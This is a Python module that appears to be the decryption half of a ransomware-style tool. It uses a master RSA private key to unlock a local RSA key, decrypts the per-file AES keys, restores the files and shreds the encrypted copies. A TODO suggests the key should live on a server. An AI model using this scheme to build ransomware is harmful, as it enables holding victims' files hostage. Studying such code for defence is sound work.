import os
from base64 import b64decode
from .symmetric_encryption import AES
from .asymmetric_encryption import RSA
from .config import ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, \
                    UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, \
                    MASTER_PRIVATE_KEY, \
                    ENCRYPTED_AES_KEY_FILE_LOCATION, \
                    UNENCRYPTED_AES_KEY_FILE_LOCATION
from . import utils


# TODO: Local RSA key decryption should happen in the server side
def decrypt_local_rsa_key():
    encrypted_local_rsa_key_parts = utils.read_data_from_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False)
    cipher = RSA(private_key=MASTER_PRIVATE_KEY)
    unencrypted_local_private_key = b"".join([cipher.decrypt_data(key_part) for key_part in encrypted_local_rsa_key_parts])
    utils.shred_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
    utils.write_data_to_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key)


def decrypt_file_encryption_details():
    local_master_private_key = utils.read_data_from_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
    cipher = RSA(private_key=local_master_private_key)
    encrypted_file_encryption_details = utils.read_data_from_file(ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)

    file_data = []
    for detail in encrypted_file_encryption_details:
        if isinstance(detail, list):
            file_data.append(b''.join([cipher.decrypt_data(part) for part in detail]))
        else:
            file_data.append(cipher.decrypt_data(detail))

    utils.write_data_to_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, file_data, serialized=False)
    utils.shred_file(ENCRYPTED_AES_KEY_FILE_LOCATION)


def decode_file_encryption_details(detail):
    detail = detail.decode("utf-8")
    detail = [b64decode(detail.encode("utf-8")) for detail in detail.split("\t")]
    return detail[0], detail[1], detail[-1]


def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
    cipher = AES(aes_key, initialization_vector)
    encrypted_data = utils.read_data_from_file(encrypted_file_path)
    data = cipher.decrypt_data(encrypted_data)
    original_file_path = os.path.splitext(encrypted_file_path)[0]
    utils.write_data_to_file(original_file_path, data)
    utils.shred_file(encrypted_file_path)


def decrypt_files():
    key_detail = utils.read_data_from_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
    for detail in key_detail:
        aes_key, initialization_vector, file_path = decode_file_encryption_details(detail)
        decrypt_file(aes_key, initialization_vector, file_path)


def start_decryption():
    decrypt_local_rsa_key()
    if not os.path.exists(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION):
        print("Unencrypted RSA key not found")
        return
    decrypt_file_encryption_details()
    decrypt_files()


